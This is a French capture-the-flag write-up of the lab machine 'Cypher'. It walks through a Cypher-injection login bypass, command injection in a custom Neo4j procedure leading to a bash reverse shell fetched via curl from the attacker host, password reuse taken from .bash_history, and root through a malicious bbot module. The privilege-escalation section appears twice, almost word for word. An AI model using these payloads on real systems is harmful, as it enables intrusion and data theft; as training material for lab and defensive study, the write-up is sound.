![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

#### Scanning & Énumération de Services

La phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d'attaque réseau.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.57

# Scan de services détaillé sur les ports identifiés
nmap -p 22,80 -sCV 10.10.11.57
```

Le scan révèle deux ports ouverts :
*   **Port 22 (SSH)** : OpenSSH 9.6p1.
*   **Port 80 (HTTP)** : Nginx 1.24.0, redirigeant vers `http://cypher.htb/`.

J'ajoute l'entrée correspondante dans mon fichier `/etc/hosts` :
```text
10.10.11.57 cypher.htb
```

#### Énumération Web & Découverte de Vecteurs

Le site web présente "Graph ASM", un outil de gestion de surface d'attaque basé sur une base de données orientée graphe. Une énumération de répertoires via **feroxbuster** avec une recherche d'extensions spécifiques est lancée.

```bash
feroxbuster -u http://cypher.htb -x php,html,js -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Résultats notables :
*   `/login` : Interface d'authentification.
*   `/api/auth` : Point de terminaison pour l'authentification (méthode POST).
*   `/testing` : Répertoire avec **Directory Listing** activé, contenant un fichier nommé `custom-apoc-extension-1.0-SNAPSHOT.jar`.

#### Analyse Statique (Reverse Engineering) du JAR

Le fichier `.jar` est une extension pour **Neo4j** utilisant **APOC** (Awesome Procedures on Cypher). J'utilise **jadx-gui** pour décompiler le bytecode Java.

La classe `CustomFunctions` contient une procédure vulnérable : `getUrlStatusCode`.

```java
@Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    // ... validation basique du protocole ...
    String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
    Process process = Runtime.getRuntime().exec(command);
    // ... lecture du résultat ...
}
```

> **Schéma Mental :**
> L'application Java prend une entrée utilisateur (`url`), la concatène directement dans une chaîne de commande système sans aucune sanitisation (hormis l'ajout de `https://` si absent), et l'exécute via `sh -c`. C'est une **Command Injection** directe si nous parvenons à invoquer cette procédure.

#### Brèche Initiale : Cypher Injection

Avant d'exploiter l'injection de commande, je dois accéder à l'interface de requête. La page de login est testée pour une **Cypher Injection** (l'équivalent SQLi pour les bases de données graphes).

En injectant un caractère spécial (`'`) dans le champ `username`, l'application retourne une erreur détaillée révélant la structure de la requête :
`MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash`

L'application compare le hash retourné par la base de données avec le hash SHA1 du mot de passe fourni par l'utilisateur. Pour bypasser l'authentification, j'utilise une clause `UNION` pour forcer la requête à retourner le hash d'un mot de passe que je contrôle.

**Payload d'injection (Username) :**
```cypher
' return h.value as hash UNION return "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash LIMIT 1;//
```
*(Note : `9948e7baab1783a947c469c4c61e9f4bcce559b0` est le hash SHA1 de `0xdf`)*.

En saisissant ce payload comme nom d'utilisateur et `0xdf` comme mot de passe, je parviens à me connecter.

#### Exploitation : Remote Code Execution (RCE)

Une fois authentifié, l'interface permet d'exécuter des requêtes **Cypher**. J'utilise la procédure personnalisée identifiée précédemment pour déclencher la **Command Injection**.

> **Schéma Mental :**
> 1. Invoquer la procédure : `CALL custom.getUrlStatusCode(...)`.
> 2. Injecter un délimiteur de commande : `;` ou `&&`.
> 3. Exécuter un **Reverse Shell**.

Je prépare un script shell sur ma machine d'attaque :
```bash
echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" > shell.sh
python3 -m http.server 80
```

Puis j'exécute la requête suivante dans l'interface web :
```cypher
CALL custom.getUrlStatusCode("cypher.htb; curl 10.10.14.6/shell.sh | bash; ") YIELD statusCode RETURN statusCode
```

**Résultat :**
La commande est exécutée par le système, télécharge mon script et l'exécute, m'octroyant un shell initial en tant qu'utilisateur `neo4j`.

```bash
nc -lnvp 443
# Connexion reçue de 10.10.11.57
neo4j@cypher:/$ id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```

---

### Énumération Interne & Post-Exploitation

Une fois le **Reverse Shell** obtenu en tant qu'utilisateur `neo4j`, ma priorité est l'énumération du système de fichiers pour identifier des vecteurs de mouvement latéral. Contrairement aux comptes de service standards, l'utilisateur `neo4j` possède un **Login Shell** configuré (`/bin/bash`) et un répertoire personnel actif dans `/var/lib/neo4j`.

L'examen des fichiers cachés révèle la présence d'un fichier `.bash_history`, ce qui est souvent une mine d'or pour récupérer des credentials saisis par erreur en ligne de commande.

```bash
# Vérification des utilisateurs et des shells
cat /etc/passwd | grep 'sh$'

# Exploration du home de neo4j
ls -la /var/lib/neo4j
cat /var/lib/neo4j/.bash_history
```

Le fichier contient la commande suivante :
`neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK`

### Mouvement Latéral : de neo4j à graphasm

L'énumération des utilisateurs via `/etc/passwd` a identifié un utilisateur humain : **graphasm**. Dans de nombreux environnements, la **Password Reuse** est une faiblesse critique. Je teste ce mot de passe pour l'utilisateur `graphasm`.

> **Schéma Mental : Pivot par Password Reuse**
> `neo4j` (Compte de service) -> Extraction de secret via `.bash_history` -> Test de collision de mot de passe -> `graphasm` (Utilisateur système)

Le mot de passe est valide pour `su` et pour une connexion **SSH**, ce qui permet d'obtenir un shell stable et persistant.

```bash
# Tentative de changement d'utilisateur
su - graphasm

# Connexion persistante via SSH
ssh graphasm@cypher.htb
```

### Escalade de Privilèges : de graphasm à root

L'énumération des privilèges **Sudo** via `sudo -l` montre que `graphasm` peut exécuter l'outil **bbot** (Bighuge BLS OSINT Tool) avec les droits **root** sans mot de passe.

```bash
graphasm@cypher:~$ sudo -l
(ALL) NOPASSWD: /usr/local/bin/bbot
```

**bbot** est un framework OSINT modulaire. La capacité d'exécuter cet outil en tant que **root** permet deux vecteurs d'attaque : un **Arbitrary File Read** partiel et une **Arbitrary Code Execution** via le chargement de modules personnalisés.

#### Vecteur 1 : Lecture de fichier (Looting)
En utilisant l'option `-w` (**Whitelist**) combinée au mode `-d` (**Debug**), l'outil tente de parser le fichier fourni. S'il s'agit d'un fichier texte simple comme `root.txt`, le contenu est parfois affiché dans les logs de debug lors de la génération des Regex de filtrage.

```bash
sudo bbot -w /root/root.txt -d
```

#### Vecteur 2 : Exécution de code via Module Custom (RCE)
C'est la méthode la plus propre pour obtenir un shell **root**. **bbot** permet de spécifier des répertoires de modules et des **Presets** via des fichiers YAML. Je crée un module Python malveillant et un fichier de configuration pour forcer son chargement.

> **Schéma Mental : Détournement de logique BBOT**
> Création d'un module Python (`os.system`) -> Création d'un Preset YAML pointant vers le module -> Exécution via `sudo bbot` -> Élévation de privilèges via l'import Python.

```bash
# 1. Création du module malveillant dans /dev/shm
echo 'import os; os.system("/bin/bash")' > /dev/shm/ExploitModule.py

# 2. Création du preset YAML pour charger le module
cat << EOF > /dev/shm/exploit.yml
modules:
  - ExploitModule
module_dirs:
  - /dev/shm/
EOF

# 3. Exécution de bbot avec le preset malveillant
sudo bbot -p /dev/shm/exploit.yml
```

L'exécution déclenche l'import du module `ExploitModule.py` avant même que le scan ne commence réellement, m'octroyant un shell interactif en tant que **root**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur la machine en tant que **graphasm**, l'objectif est d'identifier une trajectoire vers les privilèges **root**. L'énumération des droits **Sudo** révèle un vecteur immédiat lié à un outil d'**OSINT** spécifique.

#### 1. Énumération des vecteurs Sudo

L'exécution de `sudo -l` montre que l'utilisateur peut exécuter **BBOT** (**Bighuge BLS OSINT Tool**) avec les privilèges les plus élevés sans mot de passe.

```bash
# Vérification des privilèges sudo
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

#### 2. Exploitation de BBOT (Vecteur de lecture de fichiers)

**BBOT** est un framework modulaire complexe. Une première méthode d'exploitation, bien que limitée, consiste à abuser de l'argument `--whitelist` (`-w`) combiné au mode `--debug` (`-d`). Lorsque **BBOT** tente de parser un fichier de whitelist qui n'est pas au format attendu, il peut refléter le contenu des lignes dans les logs de debug.

```bash
# Lecture arbitraire (partielle) via le mode debug
sudo bbot -w /root/root.txt -d
```

> **Schéma Mental :**
> **Sudo Privilege** sur un outil complexe -> Recherche d'arguments de lecture de fichiers (`-w`) -> Activation de la verbosité maximale (`-d`) -> Fuite de données (Leak) via le parsing des erreurs de la **Regex** interne de l'outil.

#### 3. Exploitation de BBOT (Vecteur RCE via Custom Module)

La méthode la plus robuste pour obtenir un **Root Shell** consiste à utiliser la capacité de **BBOT** à charger des modules personnalisés. En définissant un répertoire de modules contrôlé par l'utilisateur, on peut forcer l'exécution de code Python arbitraire lors de l'initialisation du scan.

**Étape A : Création du module malveillant**
On crée un fichier Python dans `/dev/shm` qui exécute une commande système dès son chargement.

```python
# /dev/shm/ExploitModule.py
import os
os.system("/bin/bash")
```

**Étape B : Configuration du profil BBOT**
On crée un fichier de configuration **YAML** pour indiquer à **BBOT** où chercher ce nouveau module.

```yaml
# /dev/shm/pwn.yml
modules:
  - ExploitModule
module_dirs:
  - /dev/shm/
```

**Étape C : Exécution**
Il suffit ensuite de lancer **BBOT** en pointant vers ce profil avec `sudo`.

```bash
# Déclenchement de l'exécution de code en tant que root
sudo bbot -p /dev/shm/pwn.yml
```

L'outil charge le module, exécute le `os.system("/bin/bash")` et nous rend un shell avec l'**UID 0**.

---

### Beyond Root : Analyse Post-Exploitation

L'analyse de l'infrastructure révèle une architecture segmentée et des erreurs de configuration critiques.

#### 1. Chemin non intentionnel (Unintended Path)
Une énumération agressive de l'**API** aurait permis de découvrir l'endpoint `/api/cypher`. Contrairement au reste de l'application, cet endpoint ne vérifie pas l'authentification, permettant une **Command Injection** directe sans passer par le **Bypass Login** initial.

```bash
# RCE directe via l'API non protégée
curl 'http://cypher.htb/api/cypher?query=CALL+custom.getUrlStatusCode("localhost;+id")+YIELD+statusCode'
```

#### 2. Architecture Web & Conteneurisation
Le serveur **Nginx** principal agit comme un **Reverse Proxy**. 
- Les fichiers statiques sont servis depuis `/var/www/graphasm`.
- Les requêtes vers `/api` et `/demo` sont redirigées vers un service tournant sur le port **8000**.
- Ce service est un conteneur **Docker** nommé `fastapi`, exécutant une application **Uvicorn/FastAPI**.

#### 3. Persistance & Neo4J
Le mot de passe trouvé dans le `.bash_history` de l'utilisateur `neo4j` (`cU4btyib.20xtCMCXkBmerhK`) était réutilisé pour le compte système `graphasm`. C'est une faiblesse classique de **Password Reuse** entre les comptes de service et les comptes utilisateurs. L'extension **APOC** personnalisée (`custom-apoc-extension-1.0-SNAPSHOT.jar`) était la source de la vulnérabilité initiale, illustrant les dangers d'implémenter des fonctions de rappel système (`Runtime.getRuntime().exec()`) sans sanitisation rigoureuse des entrées utilisateur dans des environnements de base de données.